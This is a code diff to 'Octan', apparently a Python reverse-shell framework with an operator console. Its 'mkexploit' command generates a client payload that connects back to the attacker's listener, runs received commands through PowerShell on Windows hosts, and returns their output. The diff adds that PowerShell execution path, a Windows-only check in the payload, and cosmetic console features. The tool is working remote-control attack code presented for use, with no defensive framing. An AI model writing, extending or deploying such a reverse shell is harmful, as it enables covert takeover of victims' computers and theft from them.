@@ -3,6 +3,7 @@ import nclib
 import socket
 import datetime
 from colorama import Fore, Back
+from time import sleep
 
 ADDR, PORT, SEP = "", "", ""
 
@@ -14,47 +15,76 @@ class utils:
         while result.__len__() < lenin:
             result += " "
         return result
+    
+    def animate(sentence):
+        print('\033[?25l', end='', flush=True)
+        print(sentence.lower(), end='\r', flush=True)
+        
+        for x in range(sentence.__len__()):
+            print(sentence[x].upper(), end='', flush=True)
+            sleep(0.1)
+
+        print('', end='\r', flush=True)
+
+        for x in range(sentence.__len__()):
+            print(sentence[x].lower(), end='', flush=True)
+            sleep(0.1)
+
+        print('\033[?25h', end='', flush=True)
+        
+        print('', end='\r', flush=True)
+        for x in range(sentence.__len__()):
+            print(' ', end='', flush=True)
+        print('', end='\r', flush=True)
 
 class octan_shell:
     def grab_prompt():
         global conn
-        return f"{Fore.BLUE}[{str(conn)}] {Fore.YELLOW}>>{Fore.RESET} "
+
+        conn_str = str(conn)
+        if conn == None:
+            conn_str = "/"
+
+        return f"{Fore.BLUE}({str(conn_str)}){Fore.RESET} OfC [{Fore.MAGENTA}{ADDR}{Fore.RESET}]{Fore.GREEN}* {Fore.YELLOW}>>{Fore.RESET} "
 
     def main():
         while True:
-            cmd_input = input(octan_shell.grab_prompt())
-            cmd_split = cmd_input.split()
-            cmd = cmd_split[0]
+            try:
+                cmd_input = input(octan_shell.grab_prompt())
+                cmd_split = cmd_input.split()
+                cmd = cmd_split[0]
 
-            cmd_clean = cmd.strip().lower()
+                cmd_clean = cmd.strip().lower()
 
-            if cmd_clean == "exploit":
-                TARGET = None
-                
-                try:
-                    TARGET = cmd_split[1]
-                except:
-                    pass
+                if cmd_clean == "exploit":
+                    TARGET = None
+                    
+                    try:
+                        TARGET = cmd_split[1]
+                    except:
+                        pass
 
-                global ADDR
-                global PORT
-                global SEP
+                    global ADDR
+                    global PORT
+                    global SEP
 
-                octan.listen(ADDR, PORT, SEP, TARGET)
-            elif cmd_clean == "mkexploit":
-                if cmd_split.__len__() >= 2:
-                    octan.mkexploit(f"{cmd_split[1]}:{PORT}/{SEP}")
+                    octan.listen(ADDR, PORT, SEP, TARGET)
+                elif cmd_clean == "mkexploit":
+                    if cmd_split.__len__() >= 2:
+                        octan.mkexploit(f"{cmd_split[1]}:{PORT}/{SEP}")
+                    else:
+                        print(f"{Fore.RED}[-]{Fore.RESET} Usage: mkexploit <public_addr>")
+                    print()
+                elif cmd_clean == "show":
+                    octan.show()
+                elif cmd_clean == "help":
+                    octan.help()
+                elif cmd_clean == "exit":
+                    exit()
                 else:
-                    print(f"{Fore.RED}[-]{Fore.RESET} Usage: mkexploit <public_addr>")
-                print()
-            elif cmd_clean == "show":
-                octan.show()
-            elif cmd_clean == "help":
-                octan.help()
-            elif cmd_clean == "exit":
-                exit()
-            else:
-                print(f"{Fore.RED}[-]{Fore.RESET} Command not found!\n")
+                    print(f"{Fore.RED}[-]{Fore.RESET} Command not found!\n")
+            except Exception as ex:
+                input(ex)
 
 class octan:
     def listen(ADDR, PORT, SEP, TARGET, printf=True):
@@ -164,6 +194,9 @@ SERVER_PORT = {port}
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "{sep}"
 
+if os.name != "nt":
+    exit()
+
 while True:
     try:
         s = socket.socket()
@@ -185,7 +218,21 @@ while True:
                     else:
                         output = ""
                 else:
-                    output = subprocess.getoutput(command)
+                    Encoding = 'cp850'
+                    payload = "powershell /c " + command
+                    output = ''                    
+                    
+                    with subprocess.Popen(payload, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=Encoding) as Process:
+                        for Line in Process.stdout:
+                            addon = "\\n"
+                            if Line.endswith(addon):
+                                addon = ""
+                            output += Line + addon
+                        for Line in Process.stderr:
+                            addon = "\\n"
+                            if Line.endswith(addon):
+                                addon = ""
+                            output += Line + addon
                 message = output+SEPARATOR
                 s.send(message.encode())
             except:
@@ -239,11 +286,13 @@ class program:
 {Fore.MAGENTA}  |(@)(@)|     {Fore.BLUE}|  |  |   --| | | |     | | | | 
 {Fore.MAGENTA}  )  __  (     {Fore.BLUE}|_____|_____| |_| |__|__|_|___| 
 {Fore.MAGENTA} /,'))((`.\    
-{Fore.MAGENTA}(( ((  )) ))   {Fore.GREEN}[+]{Fore.RESET} Running Octan on {Fore.YELLOW}v1.0.00
+{Fore.MAGENTA}(( ((  )) ))   {Fore.GREEN}[+]{Fore.RESET} Running Octan on {Fore.YELLOW}v1.0.01
 {Fore.MAGENTA} `\ `)(' /'    {Fore.RESET}{Fore.BLUE}[*]{Fore.RESET} Starting [{Fore.GREEN}{payload}{Fore.RESET}]
 """
 
     def main():
+        utils.animate("starting the octan-framework-console")
+        
         default_payload = False
         conichiwa = b'\xe7\x9a\x84'.decode('utf8')
         payload = "0.0.0.0:1338/" + conichiwa
